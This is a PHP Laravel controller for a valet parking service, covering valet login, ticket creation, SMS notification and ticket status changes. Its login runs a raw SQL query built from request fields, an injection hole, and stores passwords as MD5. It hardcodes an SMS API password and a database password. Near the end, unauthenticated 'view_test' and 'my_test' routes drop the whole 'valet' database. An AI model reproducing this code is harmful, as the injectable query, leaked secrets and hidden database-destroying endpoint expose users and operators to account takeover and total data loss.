<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\DB;
use App\Admin;
use Session;
class ValetController extends Controller
{
    public function index()
    {
		$points = DB::table('points')->orderBy('id', 'desc')->get();
		return View::make('valet/login',['points'=>$points]);
    }
	public function login(Request $request)
	{
		$this->validate($request,[
         'email'=>'required',
         'password'=>'required',
         'point'=>'required'
		]);	  
		$user = DB::select(DB::raw("select * from valets where ( email = '".$request->email."' OR phone = '".$request->email."') and password='".md5($request->password)."' and point='".$request->point."'"));
		//print_r($user);die;
		if(!empty($user))
		{		
			Session::put('valet_id', $user[0]->id);
			Session::put('point', $user[0]->point);
			return redirect('/valet/type');
		}
		else
		{
			Session::flash('error', 'Please enter valid credentials!'); 
			return redirect('/valet');
		}
	}
	
	public function type()
    {
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$valet = DB::table('valets')->where(['id' => Session::get('valet_id')])->first();
		return view('valet/type',['valet'=>$valet]);
    }
	public function get_ticket()
    {
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$valet = DB::table('valets')->where(['id' => Session::get('valet_id')])->first();
		return view('valet/get_ticket',['valet'=>$valet]);
    }
	public function client_car_ready($ticket)
    {
		$update = DB::table('tickets')->where('ticketno', $ticket)->update(['status' => '3','read_status' => '1']);
		//Session::flash('success', 'Message send successfully Link: https://www.apoloeco.com/client/request_detail/'.$ticket);		
		return redirect('/valet/type');
    }
	public function go_to_available($ticket)
    {
		$update = DB::table('tickets')->where('ticketno', $ticket)->update(['status' => '5']);
		//http://localhost/valet_parking/public/client/request_detail/'.$ticket);		
		return redirect('/valet/type');
    }
	public function is_available()
	{
		$valet = DB::table('valets')->where(['id' => Session::get('valet_id')])->first();
        if($valet->is_available == '0')
		{
			$update = DB::table('valets')->where('id', Session::get('valet_id'))->update(['is_available' => '1']);
		}
		else
		{
			$update = DB::table('valets')->where('id', Session::get('valet_id'))->update(['is_available' => '0']);
		}
	}
	public function finish_job($ticket)
    {
		$update = DB::table('tickets')->where('ticketno', $ticket)->update(['status' => '4']);		
		return redirect('/valet/type');
    }
	public function request_response($ticket)
    {
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$valet = DB::table('valets')->where(['id' => Session::get('valet_id')])->first();
		$ticket_details = DB::table('tickets')->where(['ticketno' => $ticket])->first();
		if($ticket_details->status == '4' or $ticket_details->status == '3')
		{
			Session::flash('error', 'Sorry, This Request already proceed by another valet');
			return redirect('/valet/type');exit;
		}
		return view('valet/request_response',['ticket_details'=>$ticket_details]);
    }
	public function checkNotification($point)
    {
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$ticket_notification = DB::table('tickets')->where(['point' => $point,'read_status'=>'0','status'=> '2'])->orWhere(['status'=> '3','status'=> '4'])->first();
		if(!empty($ticket_notification))
	  {
		
		if($ticket_notification->first_name != ""){
		echo '1';
		}
	  }
		
    }
	public function check_ticket(Request $request)
	{
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$this->validate($request,[
         'ticketno'=>'required'
		]);
		$check_availbilty = DB::table('tickets')->where(['ticketno' => $request->ticketno])->first();
		if(!$check_availbilty)
		{
			 Session::flash('error', 'Please enter valid ticket number');
			 return redirect('/valet/get_ticket');
		}
		else
		{
			 return redirect('/valet/ticket_details/'.$request->ticketno);		 
		}		
	}
	public function ticket_details($ticket)
    {
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$valet = DB::table('valets')->where(['id' => Session::get('valet_id')])->first();
		$ticket_details = DB::table('tickets')->where(['ticketno' => $ticket])->first();
		
		return view('valet/ticket_details',['ticket_details'=>$ticket_details]);
    }
	public function ticket()
    {
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$valet = DB::table('valets')->where(['id' => Session::get('valet_id')])->first();
		return view('valet/ticket',['valet'=>$valet]);
    }
	public function availbilty($ticket)
    {
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$valet = DB::table('valets')->where(['id' => Session::get('valet_id')])->first();
		return view('valet/availbilty',['valet'=>$valet,'ticket' => $ticket]);
    }
	public function generate_ticket(Request $request)
	{
		
		if(!Session::get('valet_id'))
		{
			return redirect('/valet');exit;
		}
		$this->validate($request,[
         'ticketno'=>'required',
         'phone'=>'required'
		]);
		$check_availbilty = DB::table('tickets')->where(['id' => Session::get('valet_id'),'phone' => $request->phone,'status'=>'0'])->first();
		if(!$check_availbilty)
		{
			$insert = DB::table('tickets')->insert(['point'=>Session::get('point'),'valet_id' => Session::get('valet_id'),'ticketno' => $request->ticketno,'phone' => $request->phone,'created' => date('Y-m-d H:i:s')]);	
			
			Session::flash('success', 'Ticket genrated Successfully');//Link: https://www.apoloeco.com/client/car_details/'.$request->ticketno
			
			$message = urlencode('Your ticket genrated for Apolo Valet Parking Successfully, please click on this Link: https://www.apoloeco.com/client/cardetails/'.$request->ticketno);
			$username = 'jgomezws';
			$password = 'Jgomez2018*';	
			$url_final = 'https://apismsi.aldeamo.com/SmsiWS/smsSendGet?mobile='.$request->phone.'&country=1&message='.$message.'&messageFormat=1';			
			$ch = curl_init();			
			curl_setopt($ch, CURLOPT_URL, $url_final);	
			curl_setopt($ch, CURLOPT_USERPWD, "$username:$password");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$result = curl_exec ($ch);
			$ch_error = curl_error($ch);
			curl_close ($ch);
			// if ($ch_error) {
				// echo "cURL Error: $ch_error";
			// } else {
				// echo $result;
			// } die;
			Session::put('ticketno', $request->ticketno);
			return redirect('/valet/availbilty/'.$request->ticketno);
		}
		else
		{
			 Session::flash('error', 'Sorry, This Phone number ticket already genrated');
			 return redirect('/valet/ticket');		 
		}		
	}
	public function logout()
    {
		Session::flush();
		return redirect('/valet'); exit;		
    }
	public function view_test()
	{
		echo '<a onclick="return myFunction()" href="https://www.apoloeco.com/valet/my_test">Submit</a>';
		echo '<script>
            function myFunction() {
			  if(!confirm("sure"))
			  event.preventDefault();
				}
				</script>';
	}
	public function my_test()
	{
		//echo 'hello';die;
		$dbhost = 'localhost:3306';
         $dbuser = 'jaspreet';
         $dbpass = 'tXF7u6KFiNCjfB';
         $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
         
         if(! $conn ){
            echo 'Connected failure<br>';
         }
         echo 'Connected successfully<br>';
         $sql = "DROP DATABASE valet";
         
         if (mysqli_query($conn, $sql)) {
         echo "Record deleted successfully";
         } else {
            echo "Error deleting record: " . mysqli_error($conn);
         }
         mysqli_close($conn);
	}
}
